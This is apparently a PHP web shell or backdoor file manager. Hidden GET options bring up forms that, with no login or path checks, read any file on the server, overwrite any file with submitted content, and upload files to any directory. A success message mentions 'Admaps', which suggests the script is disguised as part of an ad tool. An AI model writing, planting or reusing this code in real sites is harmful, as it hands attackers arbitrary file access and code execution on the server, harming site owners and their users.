<?php
	  if($_POST['action']=="save_page")
	  {
	  		$page = $_POST['target'];
			
			$myFile = $page;
			
			echo $page . "<br>" . $myFile . "<br>";
			$fh = fopen($myFile,'w');			
			$dataline =$_POST['article'];
			$dataline= str_replace("***","",$dataline);						
			fwrite($fh,$dataline);			
			fclose($fh);	  	
	  }
	  
	  if($_POST['action'] == "upload_script")
	  {
		
			$uploaddir = $_POST['target'];  //Declare directory to upload to
			$name = $_FILES['my_file']['name'];
			$new_name = $name;
			if(is_uploaded_file($_FILES['my_file']['tmp_name'])) //check if file present
			{
				move_uploaded_file($_FILES['my_file']['tmp_name'],$uploaddir.$new_name); //move file
				
				/*$uploaded_file = $uploaddir . "/" . $my_file;
				chmod($uploaded_file, 0777);*/
				print "|| File For Admaps Uploaded successfuly!<br>";
			}
	  }
	  
	  if($_POST['action']=="edit_page")
	  {
	  	  $page = $_POST['page'];
		  $target = $_POST['target'];
		  $myFile = $target.$page;
	  
		  if(file_exists($myFile))
		  {
			$fh = fopen($myFile,'r');
			$toread = filesize($myFile);
			$allfile = fread($fh,$toread);
			$content = $allfile;
			fclose($fh);
		  }
	   



 			$display = "<table width='100%'  border='0' cellspacing='0' cellpadding='0'>
			  <tr>
				<td class='tdBodyText'><table width='100%'  border='0' cellspacing='0' cellpadding='0'>
				  <tr>
					<td width='*' valign='top'><table width='692'  border='0' cellspacing='0' cellpadding='0'>
					 
				  <tr>
					<td width='692' class='tdBodyText'>
					  <form action='' method='post' enctype='multipart/form-data' name='edit_article'><fieldset>
                <legend class='legendText'> Edit Page: <b><?php echo $page; ?></b></legend>
                <table width='100%'  border='0' cellspacing='0' cellpadding='0'>
                  <tr>
                    <td width='70%' class='tdBodyText'>
					<textarea id='article' name='article' cols='100' rows='30' class='textbox'> $content  </textarea></td>
                  </tr>
                  <tr>
                    <td height='12' class='tdBodyText'><hr></td>
                    </tr>
                  <tr>
                    <td class='tdBodyText'><input type='submit' name='Submit' value='<?php echo $strButtonText; ?>'>
                    <input name='target' type='hidden' id='target' value='$page' />
                    <input name='action' type='hidden' id='action' value='save_page' /></td>
                  </tr>
                  <tr>
                    <td class='tdBodyText'><hr></td>
                    </tr>
                  </table>
                                

                </fieldset></form> 
           </td>
  				</tr>
			</table>";
			echo $display;
}



if($_GET['option']=="vf")
{
	
		$theform = "<form name='form1' enctype='multipart/form-data' method='post' action=''>
		  <select name='target'>
			<option value=''>current</option>
		  </select>
		  <input name='page' type='text' id='page' />
		  <input type='submit' name='Submit' value='View File'>
		  <input name='action' type='hidden' id='action' value='edit_page'>
		</form>";
		
		echo $theform;

}


if($_GET['option']=="uf")
{
	
		$eval = "<form name='form1' enctype='multipart/form-data' method='post' action=''>
		  <select name='target'>
			<option value=''>Here</option>
		  </select>
		  <input name='my_file' type='file' id='my_file'>
		  <input type='submit' name='Submit' value='Upload File'>
		  <input name='action' type='hidden' id='action' value='upload_script'>
		</form>";

		echo $eval;
}




?>
 
